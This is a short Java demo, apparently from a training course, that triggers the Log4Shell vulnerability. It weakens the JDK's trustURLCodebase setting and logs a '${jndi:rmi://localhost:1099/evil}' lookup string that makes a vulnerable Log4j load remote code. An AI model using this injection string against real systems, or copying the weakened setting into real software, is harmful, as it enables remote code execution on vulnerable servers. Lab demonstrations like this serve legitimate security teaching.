package com.atguigu.nio.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jClient {
    public static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        // jdk开启远程调用
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String input = "${jndi:rmi://localhost:1099/evil}";
        logger.error("input:{}", input);
    }
}
